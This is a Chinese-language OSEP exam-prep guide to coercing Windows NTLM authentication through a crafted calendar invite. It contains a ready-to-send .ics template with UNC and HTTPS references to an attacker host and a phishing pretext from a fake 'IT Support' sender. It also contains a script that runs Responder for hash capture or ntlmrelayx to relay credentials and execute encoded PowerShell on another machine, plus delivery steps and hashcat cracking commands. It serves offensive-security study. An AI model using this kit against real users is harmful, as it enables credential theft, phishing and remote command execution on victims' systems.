::: warning 仅供授权实验与备考学习
本文是个人备考教材。源码只用于 OSEP 官方实验/考试环境，或你拥有书面授权的目标。禁止对未授权系统使用。
:::

# 16 · ICS 日历邀请触发认证（场景 13）

> 一句话：知道收件人地址、目标会处理会议邀请、但没有宏执行机会 → 发一个**引用外部资源**的 `.ics` 邀请，诱使日历客户端在解析/渲染/提醒时主动访问我方资源并发起认证；攻击机侧用 Responder 捕获哈希，或用 ntlmrelayx 直接中继到别的 SMB 目标。
> 教材第 5 章（Initial Access / 客户端侧）；cheat sheet 关键词：`Relay Attacks`、`Capture Hashes`（见 `reference/osep-cheatsheet.md` ~L6207 与 ~L7381）。
> **核心认知：触发条件取决于日历客户端的版本与配置——"收到邀请 / 被接受" ≠ "会发起认证"。必须先有认证日志证据，再谈后续。**

---

## 场景 13：ICS 日历邀请触发认证

## 1. 场景回顾

> 来自 `scenarios.md`（场景 13）：目标接受日历邀请，但没有宏执行机会。你知道收件人的地址，目标会处理会议邀请。实验中的日历客户端**可能**访问邀请引用的外部资源，并发起认证。
> 可提前准备：教材中的 ICS 邀请文件，以及对应的**认证接收和后续处理命令笔记**。

一句话考点：`.ics` 邀请是"触发客户端主动连回攻击机"的载体；`LOCATION`/`DESCRIPTION`/`URL`/`ATTACH` 字段里放 UNC 路径或 URL，客户端处理邀请时可能发起 SMB（`\\LHOST\...`）或 HTTP(S) 请求。认证成功与否、以什么协议回连，全部由客户端行为决定，**不可预设**。

---

## 2. 前提与假设

| 假设 | 说明 | 不成立时 |
|---|---|---|
| 已知目标邮箱地址 | 场景直接给 `USER@DOMAIN` | 无法投递，换入口 |
| 目标会打开/接受日历邀请 | 客户端至少会解析邀请内容 | 见失败分支 1 |
| 客户端会解析外部引用 | Outlook / OWA / Thunderbird / 苹果日历等对 LOCATION/URL/附件的自动处理行为不同 | 见失败分支 2、3 |
| 目标可回连攻击机 | 认证 = 目标主动连 `LHOST`，出网方向必须可达 | 在目标侧找一个能回连的位置再谈 |
| 目标身份有横向价值 | 域用户；哈希可破解/中继 | 哈希只能破解则价值有限，见 §8 |
| 客户端跑在 Windows | SMB 引用才能触发 NTLM(NLTMv2) 认证 | 非 Windows 客户端通常只抓 HTTP，无认证哈希 |

考试环境默认：攻击机 Kali、目标 Windows + AD（域用户）、Outlook/OWA 一类客户端处理邀请。

---

## 3. 触发原理（为什么客户端会去访问外部资源）

`.ics`（iCalendar，RFC 5545）里一个会议邀请（`VEVENT`）可以有这些字段，客户端处理时可能主动去访问：

- `LOCATION`：放 UNC 路径 `\\LHOST\share\...`。部分客户端渲染邀请/提醒时解析网络位置；若用户点开"位置"，Windows 资源管理器会走 SMB → 认证。
- `DESCRIPTION`：放 `https://URL/...` 或 UNC 路径；支持 HTML 正文的客户端若自动加载外部内容会发 HTTP 请求。
- `URL`：邀请自带的链接，用户点击或用阅读窗格预览时可能抓取。
- `ATTACH;FMTTYPE=...`：引用外部附件，客户端"下载附件预览"时会抓取。

**实际触发情况高度分散**：Outlook 默认"阻止自动下载图片/外部内容"；不同版本对 LOCATION 里的 UNC 是否解析、是否发 SMB 探测行为不一。因此不要押注单一字段——把**同一份邀请里放多个引用**（SMB + HTTPS token 各一个），让日志告诉你客户端到底碰了哪个。

> 设计原则：SMB 引用是拿认证哈希的主力；HTTP(S) 引用只用来**证明客户端确实在抓取外部内容**（验证"触发链路通不通"），两者互为探针。

---

## 4. 准备（攻击机侧）

基础设施（目录、端口约定）见 [`docs/00-environment-and-infra.md`](/modules/00-environment-and-infra)，这里只列场景 13 专属的准备。

```bash
mkdir -p ~/osep/{logs,payloads/infra,loot}

# 工具存在性检查
which responder impacket-ntlmrelayx hashcat

# 唯一 token：区分"哪个受害者、哪一次投递"
TOKEN="m16-$(date +%s | tail -c 6)"      # 例: m16-3f2a91
echo "$TOKEN"                            # 记到笔记，稍后写进 ICS 和日志过滤
```

### 4.1 生成邀请文件（替换占位符）

模板 `scripts/infra/m16-ics-invite.ics` 用统一占位符：`LHOST` `URL` `USER` `DOMAIN`。发信前用 sed 一次性替换，并生成**每次唯一的 token 路径**：

```bash
cd ~/osep/payloads/infra
sed -e "s/LHOST/192.168.45.10/g" \
    -e "s|URL|http://192.168.45.10|g" \
    -e "s/USER/victim/g" -e "s/DOMAIN/corp.local/g" \
    -e "s/TOKEN/${TOKEN}/g" \
    /Users/barok/Desktop/osep-prep/scripts/infra/m16-ics-invite.ics \
    > invite-${TOKEN}.ics
head -20 invite-${TOKEN}.ics      # 确认替换结果再发
```

> `.ics` 规范上要求 CRLF 行尾与长行折叠；多数客户端（含 Outlook）容忍 LF。若目标客户端解析失败，先做行尾转换再重发：`sed -i 's/$/\r/' invite-${TOKEN}.ics`。

### 4.2 准备捕获（两种模式二选一或先后）

捕获（拿哈希）与中继（直接打另一台）**不能同时跑**——ntlmrelayx 和 Responder 都占用 445 等端口。流程建议：先捕获模式确认触发；确认 SMB 签名关闭后再切中继。一键脚本见 `scripts/linux/m16-auth-capture.sh`，手工等价命令：

```bash
# 模式 A：Responder 捕获（默认只开在指定网卡，关闭 WPAD 减少噪音）
sudo responder -I eth0 -wv 2>&1 | tee -a ~/osep/logs/responder.log
#   参数说明：-I 网卡；-w 起 WPAD 代理（考试场景可加）；-v 详细输出

# 模式 B：ntlmrelayx 中继到指定 SMB 目标（需确认目标 SMB signing 关闭）
sudo impacket-ntlmrelayx --no-http-server -smb2support \
  -t smb://TARGET \
  -c "powershell -enc BASE64PAYLOAD" -of ~/osep/loot/relay-hashes.txt
```

SMB signing 状态检查（中继前必做）：

```bash
nmap -p 445 --script smb2-security-mode TARGET
# smb2-security-mode 报告 "Message signing enabled but not required" 才可中继
```

---

#### 源码 `scripts/infra/m16-ics-invite.ics` {#scripts-infra-m16-ics-invite-ics}

````text
# ---- header (NOT part of the iCalendar spec) --------------------------------
# 用途: 日历邀请模板 —— 通过 LOCATION/DESCRIPTION/URL/ATTACH 引用攻击机资源,
#       诱导日历客户端处理邀请时主动访问我方 SMB/HTTP 资源并发起认证
# 场景: 场景 13 (目标接受日历邀请但没有宏执行机会, docs/16-ics-calendar.md)
# 依赖: 攻击机侧已运行 Responder(收 SMB 认证) 或 ntlmrelayx(中继),
#       以及可选的 HTTP token 探针 (python3 -m http.server 80)
# 使用: 先 sed 替换占位符再投递, 例:
#   sed -e "s/LHOST/192.168.45.10/g" -e "s|URL|http://192.168.45.10|g" \
#       -e "s/USER/victim/g" -e "s/DOMAIN/corp.local/g" \
#       -e "s/TOKEN/m16-3f2a91/g" m16-ics-invite.ics > invite.ics
#       投递方式: 邮件附件 .ics 或 inline text/calendar; METHOD=REQUEST 是会议请求
# 占位符: LHOST=攻击机IP  URL=我方HTTP地址(不带结尾/)  USER=目标账户
#         DOMAIN=邮件域   TOKEN=本次投递唯一标识(区分受害者与确认抓取)
# 测试状态: 结构经 RFC 5545 基本字段核对, 未在真实日历客户端实测
#           注意: 若客户端拒绝解析, 先删掉上方 # 注释行并转 CRLF 行尾再发
# -----------------------------------------------------------------------------
BEGIN:VCALENDAR
VERSION:2.0
PRODID:-//M16-OSEP//ICS-INVITE//EN
METHOD:REQUEST
CALSCALE:GREGORIAN
BEGIN:VEVENT
UID:m16-TOKEN@LHOST
DTSTAMP:20250101T000000Z
DTSTART:20250101T130000Z
DTEND:20250101T140000Z
SUMMARY:Review and confirm shared document
LOCATION:\\\\LHOST\\share\\TOKEN
DESCRIPTION:Materials for review are ready.\nAccess them at https://URL/TOKEN or from the shared folder \\\\LHOST\\share\\TOKEN.
URL:https://URL/TOKEN/invite.html
ATTACH;FMTTYPE=text/html:https://URL/TOKEN/preview.html
ORGANIZER;CN=IT Support:mailto:it-support@DOMAIN
ATTENDEE;ROLE=REQ-PARTICIPANT;RSVP=TRUE;CN=USER:mailto:USER@DOMAIN
END:VEVENT
END:VCALENDAR
````

#### 源码 `scripts/linux/m16-auth-capture.sh` {#scripts-linux-m16-auth-capture-sh}

````bash
#!/usr/bin/env bash
# 用途: 场景 13 认证接收端一键脚本 —— Responder 捕获 Net-NTLMv2 / ntlmrelayx 中继 /
#       HTTP token 探针, 统一日志落盘与端口占用检查; 拿到哈希后打印处理提示
# 场景: docs/16-ics-calendar.md (ICS 日历邀请触发目标主动认证)
# 依赖: responder(或 impacket-ntlmrelayx)、python3、lsof; 需 root(监听 445/80)
# 使用:
#   bash m16-auth-capture.sh capture IFACE [LOGDIR]      # Responder 收哈希
#   bash m16-auth-capture.sh relay TARGET CMD [LOGDIR]   # 中继到 SMB 目标执行命令
#   bash m16-auth-capture.sh probe [DIR]                 # HTTP token 探针(80)
#   示例: bash m16-auth-capture.sh capture eth0
#         bash m16-auth-capture.sh relay 10.10.10.5 \
#             "powershell -enc SQBFAFgAIAAoAC4ALgApAA=="
# 占位符: IFACE=监听网卡  TARGET=SMB中继目标IP  CMD=目标上执行的命令
#         LOGDIR=日志目录(默认 ~/osep/logs)  LHOST 见 docs/00
# 测试状态: 已通过 bash -n; 本机未实测(需要 Kali + root + responder)
set -euo pipefail

MODE="${1:-}"
LOGDIR="${3:-$HOME/osep/logs}"
mkdir -p "$LOGDIR"

port_busy() { # $1=port ; 占用返回 0
  command -v lsof >/dev/null 2>&1 && lsof -nP -iTCP:"$1" -sTCP:LISTEN >/dev/null 2>&1
}

case "$MODE" in
  capture)
    IFACE="${2:-}"
    [[ -z "$IFACE" ]] && { echo "用法: $0 capture IFACE [LOGDIR]" >&2; exit 1; }
    command -v responder >/dev/null 2>&1 || { echo "[!] 未安装 responder" >&2; exit 1; }
    port_busy 445 && { echo "[!] 445 被占用, 换端口或先停 ntlmrelayx/smb 服务" >&2; exit 1; }
    TS="$(date +%Y%m%d-%H%M%S)"
    LOG="$LOGDIR/responder-$TS.log"
    echo "[*] 启动 Responder @ $IFACE, 日志: $LOG"
    echo "[*] 投递 ICS 后, 认准这一行才算认证成立:"
    echo "    [SMB] NTLMv2-SSP Username : DOMAIN\\\\user   (+ Hash 行)"
    # -w 起 WPAD, -v 详细; 如噪音大可去掉 -w
    sudo responder -I "$IFACE" -wv 2>&1 | tee -a "$LOG"
    echo "[*] 拿到哈希后: hashcat -m 5600 <hash> /usr/share/wordlists/rockyou.txt"
    echo "[*] 哈希文件在 $LOG (含 [SMB] ... Hash 行, 需手工整理成单哈希/文件)"
    ;;
  relay)
    TARGET="${2:-}"
    CMD="${3:-}"
    [[ -z "$TARGET" || -z "$CMD" ]] && {
      echo "用法: $0 relay TARGET \"CMD\" [LOGDIR]" >&2
      echo "  先确认目标 SMB signing 未强制: nmap -p445 --script smb2-security-mode TARGET" >&2
      exit 1
    }
    command -v impacket-ntlmrelayx >/dev/null 2>&1 || { echo "[!] 未安装 impacket-ntlmrelayx" >&2; exit 1; }
    port_busy 445 && { echo "[!] 445 被占用, 先停 Responder 再切中继(两者不能同跑)" >&2; exit 1; }
    TS="$(date +%Y%m%d-%H%M%S)"
    LOG="$LOGDIR/ntlmrelayx-$TS.log"
    echo "[*] 中继到 smb://$TARGET, 日志: $LOG"
    # --no-http-server: 不占 80, 留给 token 探针; -of 保存捕获哈希
    sudo impacket-ntlmrelayx --no-http-server -smb2support \
      -t "smb://$TARGET" -c "$CMD" -of "$LOG.hashes" 2>&1 | tee -a "$LOG"
    echo "[*] 中继成立标志: Authenticating against smb://$TARGET ... SUCCEED"
    ;;
  probe)
    DIR="${2:-$HOME/osep/payloads}"
    port_busy 80 && { echo "[!] 80 被占用" >&2; exit 1; }
    [[ -d "$DIR" ]] || { echo "[!] 目录不存在: $DIR" >&2; exit 1; }
    TS="$(date +%Y%m%d-%H%M%S)"
    LOG="$LOGDIR/http-token-$TS.log"
    echo "[*] HTTP token 探针 @ :80, 目录: $DIR, 日志: $LOG"
    echo "[*] 出现 唯一token 路径请求 = 客户端在抓外部内容(≠认证, 见 docs/16 §7)"
    (cd "$DIR" && python3 -m http.server 80 2>&1 | tee -a "$LOG")
    ;;
  *)
    echo "用法: $0 {capture|relay|probe} ..." >&2
    echo "  capture IFACE     Responder 捕获 (需 root, 占 445)" >&2
    echo "  relay TARGET CMD  ntlmrelayx 中继 (先停 capture, 占 445)" >&2
    echo "  probe [DIR]       HTTP token 探针 (占 80)" >&2
    exit 1
    ;;
esac
````

## 5. 执行步骤

1. **启动接收端**：`bash ~/osep/payloads/infra/../scripts/linux/m16-auth-capture.sh`（或 §4.2 手工命令）。确认监听端口已开、日志路径正确。
2. **起 HTTP token 探针**（可选但推荐）：`python3 -m http.server 80 --directory ~/osep/payloads` 并盯日志——只有 token 路径被请求，才证明客户端在抓外部内容。
3. **生成邀请**：§4.1 替换占位符，生成 `invite-${TOKEN}.ics`。
4. **投递**（两条路都试，先附件后 inline）：
   - 附件：邮件带 `invite-${TOKEN}.ics`，正文一句引导："请打开附件中的会议邀请并接受"。
   - inline：HTML 邮件里直接嵌 `Content-Type: text/calendar; method=REQUEST` 的日历块（部分客户端只处理 inline 邀请，不碰附件）。
5. **观察**（关键动作，别急着切工具）：Responder / ntlmrelayx 日志里是否出现目标 IP 的 `[SMB] NTLMv2-SSP` 行；HTTP 日志里是否出现 token 路径。记录时间与来源 IP。
6. **处理哈希**：出现认证 → 停止发送，进入 §8 按类型处理；只有 HTTP 抓取 → 说明客户端在抓外部内容但没走 SMB，按失败分支 2/3 调。
7. **收尾**：捕获会话结束，停 Responder/中继，日志归档到 `~/osep/logs/`，哈希存 `~/osep/loot/`。

---

## 6. 用到的脚本

| 文件 | 作用 | 何时用 |
|---|---|---|
| `scripts/infra/m16-ics-invite.ics` | 引用外部资源的邀请模板（LOCATION=UNC、URL/ATTACH=https token、DESCRIPTION 双引用） | 替换占位符后作为邮件附件/inline 投递 |
| `scripts/linux/m16-auth-capture.sh` | Responder 捕获 / ntlmrelayx 中继一键脚本（含端口占用检查、日志落盘、hashcat 提示） | 每次投递前在攻击机启动 |

相关参考：cheat sheet `Relay Attacks`（~L6207）、`Capture Hashes`（~L7381）；哈希后续利用可参考 [`docs/07-credentials-lsass.md`](/modules/07-credentials-lsass) 与 [`docs/12-ad-attacks.md`](/modules/12-ad-attacks)。

---

## 7. 验证（收到邀请 ≠ 会认证）

**唯一可信的"已认证"证据是认证协议日志**，不是"投递成功"或"对方抓了 HTTP 内容"。

| 观察到的现象 | 结论 |
|---|---|
| Responder 出现 `[SMB] NTLMv2-SSP Username : DOMAIN\user` + `Hash` 行，来源 = 目标 IP | ✅ 认证成立，进入 §8 |
| ntlmrelayx 出现 `Authenticating against smb://TARGET ... SUCCEED` + `Executed specified command` | ✅ 中继成立（等于拿到了对 TARGET 的会话） |
| HTTP 日志出现 token 路径请求 | ⚠️ 客户端在抓外部内容，但**不代表认证**——继续观察/换 SMB 引用 |
| 只有 SMTP 投递回执，无任何回连 | ❌ 未触发，走失败分支 |
| 收到认证但用户是无关账户/来源不是目标 | ⚠️ 过滤或重新投递，见失败分支 4 |

验证节奏建议：投递后**留足观察窗口**（客户端"下次打开/提醒触发"时间不定），同时并行准备别的入口，不要干等。

---

## 8. 捕获到的哈希怎么处理（决策树）

```
拿到认证
├─ 协议是 SMB 且 Hash 行是 NTLMv2-SSP → Net-NTLMv2
│   ├─ 破解：hashcat -m 5600 hash.txt rockyou.txt
│   │    成功 → 得到明文 PASS → 正常横向/WinRM/域内使用
│   │    失败 → 不能 PTH（Net-NTLMv2 是挑战应答产物，不是 NTLM 哈希）
│   └─ 中继：切 ntlmrelayx 到 SMB signing 关闭的目标（§4.2 模式 B）
├─ 拿到的是 NTLM（本机 SAM 等场景才有）→ 可直接 PTH
└─ 只拿到 HTTP 抓取（无认证）→ 本场景拿不到哈希，换入口或换客户端行为
```

要点：
- Net-NTLMv2（hashcat `-m 5600`）只能破解或中继；**不要尝试 PTH**。
- 中继目标选择：同域、SMB signing 未强制；`crackmapexec smb 网段 --gen-relay-list` 可批量找。
- 破解词表与规则、PTH 用法见 [`docs/07-credentials-lsass.md`](/modules/07-credentials-lsass)。

---

## 9. 失败分支与备选

1. **客户端不解析附件 `.ics`**（只当未知附件）：改用 inline `text/calendar` 邮件；或两种一起发（附件 + inline），看哪种被处理。仍不行 → 客户端可能不处理日历邀请，换投递通道（Web 日历邀请链接、邮件里嵌邀请）或放弃该入口。
2. **客户端把 LOCATION 当纯文本**（渲染但不解析 UNC）：改在 `URL` 字段放 `https://URL/...` 看是否被预览抓取；或 `DESCRIPTION` 里放可点击链接并配一句引导语让用户点——用户点击 URL/UNC 同样触发 SMB/HTTP 认证（此时本质是链接点击，认证来源仍是目标用户）。
3. **抓到 HTTP 抓取但没有 SMB 认证**：客户端自动下载外部内容被禁用或协议偏好 HTTP。对策：邀请里 SMB 引用 + HTTPS 引用并存（模板已内置），确认 SMB 引用没被客户端当普通文本删掉；不行则接受"只能证明可达"，转向能直接触发认证的字段（ATTACH 外部文件预览）。
4. **捕获到无关哈希**（来源 IP/用户名不是目标）：过滤 `responder.log` 里目标 IP 的行；token 只放进给目标的那份邀请，其它请求一律忽略。
5. **中继失败**（SMB signing 强制 / 端口冲突 / 目标不可达）：退回"捕获 + 破解"；或换中继目标；ntlmrelayx 报 `no more targets` 通常是 signing 或权限问题，回 §4.2 检查。
6. **长时间无任何回连**：先确认接收端活着（`ss -ltnp | grep -E '445|80'`）、`LHOST` 是目标**可达**的地址（别用 NAT 内网 IP）；确认邀请真的发出（投递回执）。都正常 → 该客户端配置不触发外部访问，属预期，换入口并按 §10 记录。

---

## 10. 考试注意 OPSEC

- **Responder 是投毒工具**：默认会抢答 LLMNR/NBT-NS/WPAD。考试里只在需要收认证时才开、只监听目标所在网卡，并记录"为什么开"；用完立即停。
- **发信动作会留痕**：只向明确的目标账户投递，不要群发；邮件主题/内容用合理的业务话术，避免把攻击意图写在正文。
- **日志纪律**：Responder/中继/HTTP 日志全部落盘到 `~/osep/logs/`，哈希进 `~/osep/loot/`——报告要能复现"什么时间、什么请求、拿到了什么"。
- **时间成本**：触发条件不确定，属于"低成功概率入口"。**先并行准备/完成其它能稳定拿分的入口**，此场景设定 20–30 分钟观察上限，超时即换。
- **不要预设成功**：验证小节里"收到邀请 ≠ 会认证"要写进笔记，报告里如实描述触发验证过程。

---

## 11. 关联文档

| 文档 | 关联点 |
|---|---|
| [`docs/00-environment-and-infra.md`](/modules/00-environment-and-infra) | 投递/监听基础设施、日志目录规范 |
| [`docs/07-credentials-lsass.md`](/modules/07-credentials-lsass) | 拿到哈希后的破解 / PTH 用法 |
| [`docs/12-ad-attacks.md`](/modules/12-ad-attacks) | 哈希/票据的横向利用与中继目标选择 |
| [`docs/01-word-vba-office.md`](/modules/01-word-vba-office) | 同属邮件/客户端入口（宏执行路径，本场景被排除） |
